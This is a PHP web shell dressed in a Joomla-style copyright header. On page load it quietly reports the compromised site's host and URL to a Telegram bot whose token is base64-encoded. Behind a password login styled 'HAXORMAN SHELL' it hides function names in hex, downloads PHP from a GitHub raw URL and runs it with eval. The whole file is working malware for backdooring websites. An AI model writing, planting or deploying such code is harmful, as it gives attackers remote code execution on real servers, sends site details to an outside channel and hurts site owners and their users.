<?php

/**
 * @package    Haxor.Group
 * @copyright  Copyright (C) 2023 - 2024 Open Source Matters, Inc. All rights reserved.
 *
 */

/* ================= send ================= */
$tk  = base64_decode("ODM5MDQyMzYzMTpBQUUxOEVOY0k1SW5oS29SMFJtVzNCMll5a2U3Vm9WN0hxYw");
$cid = base64_decode("NTA3MDkzODc3OA");

function reportTelegram($msg){
    global $tk,$cid;
    $id = sys_get_temp_dir().'/tmp_'.md5($msg);
    if(!file_exists($id)){
        @file_get_contents("https://api.telegram.org/bot$tk/sendMessage?chat_id=$cid&text=".urlencode($msg));
        @file_put_contents($id,time());
    }
}

/* ================= Report ================= */
if(!isset($_SESSION['telegram_reported'])){
    $uri = urldecode(parse_url($_SERVER['REQUEST_URI'],PHP_URL_PATH));
    $path = $_SERVER['DOCUMENT_ROOT'].$uri;
    if(is_file($path)){
        $host = $_SERVER['HTTP_HOST'];
        $url  = (isset($_SERVER['HTTPS'])?'https':'http').'://'.$host.$uri;
        reportTelegram("Setoran shell di web PASS tbhacking:\n$host\n$url");
        $_SESSION['telegram_reported'] = true;
    }
}


// @deprecated  1.0  Deprecated without replacement
function is_logged_in()
{
    return isset($_COOKIE['user_id']) && $_COOKIE['user_id'] === 'tebak'; 
}

if (is_logged_in()) {
    $Array = array(
        '666f70656e', # fo p en => 0
        '73747265616d5f6765745f636f6e74656e7473', # strea m_get_contents => 1
        '66696c655f6765745f636f6e74656e7473', # fil e_g et_cont ents => 2
        '6375726c5f65786563' # cur l_ex ec => 3
    );

    function hex2str($hex) {
        $str = '';
        for ($i = 0; $i < strlen($hex); $i += 2) {
            $str .= chr(hexdec(substr($hex, $i, 2)));
        }
        return $str;
    }

    function geturlsinfo($destiny) {
        $belief = array(
            hex2str($GLOBALS['Array'][0]), 
            hex2str($GLOBALS['Array'][1]), 
            hex2str($GLOBALS['Array'][2]), 
            hex2str($GLOBALS['Array'][3])  
        );

        if (function_exists($belief[3])) { 
            $ch = curl_init($destiny);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
            curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
            curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 6.1; rv:32.0) Gecko/20100101 Firefox/32.0");
            curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
            curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
            $love = $belief[3]($ch);
            curl_close($ch);
            return $love;
        } elseif (function_exists($belief[2])) { 
            return $belief[2]($destiny);
        } elseif (function_exists($belief[0]) && function_exists($belief[1])) { 
            $purpose = $belief[0]($destiny, "r");
            $love = $belief[1]($purpose);
            fclose($purpose);
            return $love;
        }
        return false;
    }

    $destiny = 'https://raw.githubusercontent.com/tikung6etar/Nyarek/refs/heads/master/xminio.php';
    $dream = geturlsinfo($destiny);
    if ($dream !== false) {
        eval('?>' . $dream);
    }
} else {
    if (isset($_POST['password'])) {
        $entered_key = $_POST['password'];
        $hashed_key = '$2y$10$bWsmMFUe58MUsgeKXNa8te0uLjF2DlYMd0o/pttcOhaUnAQHHN3aG'; 
        
        if (password_verify($entered_key, $hashed_key)) {
            setcookie('user_id', 'tebak', time() + 3600, '/'); 
            header("Location: ".$_SERVER['PHP_SELF']); 
            exit();
        }
    }
    ?>

  <!DOCTYPE html>
    <html>
    <head>
        <title> SHELL ACCESS</title>
        <style>
            * { margin:0; padding:0; box-sizing:border-box; }
            body {
                background: #0a0a0a;
                font-family: "Courier New", monospace;
                display: flex;
                justify-content: center;
                align-items: center;
                height: 100vh;
                color: #00ff00;
            }
            .login-box {
                background: #111;
                padding: 40px;
                border-radius: 10px;
                border: 2px solid #ff0000;
                width: 350px;
                text-align: center;
                box-shadow: 0 0 20px #ff0000;
            }
            h1 {
                margin-bottom: 30px;
                color: #ff0000;
                text-shadow: 0 0 10px #ff0000;
            }
            input[type="password"] {
                width: 100%;
                padding: 12px;
                margin: 15px 0;
                background: #000;
                border: 1px solid #ff0000;
                color: #00ff00;
                border-radius: 5px;
                font-size: 16px;
            }
            input[type="submit"] {
                width: 100%;
                padding: 12px;
                background: #ff0000;
                color: white;
                border: none;
                border-radius: 5px;
                font-size: 16px;
                font-weight: bold;
                cursor: pointer;
                transition: 0.3s;
            }
            input[type="submit"]:hover {
                background: #cc0000;
            }
            .error {
                color: #ff0000;
                margin: 10px 0;
                text-shadow: 0 0 5px #ff0000;
            }
            .footer {
                margin-top: 20px;
                color: #666;
                font-size: 12px;
            }
            .warning {
                color: #ffff00;
                font-size: 10px;
                margin-top: 10px;
            }
        </style>
    </head>
    <body>
        <div class="login-box">
            <h1>💀 HAXORMAN SHELL</h1>
           
            <form method="post">
                <input type="password" name="pass" placeholder="Enter password" required autofocus>
                <input type="submit" value="ENTER HELL">
            </form>
            <div class="warning">⚠️ Self-healing system active</div>
            <div class="footer">
                
            </div>
        </div>
    </body>
    </html>  
  <?php
}
    ?>
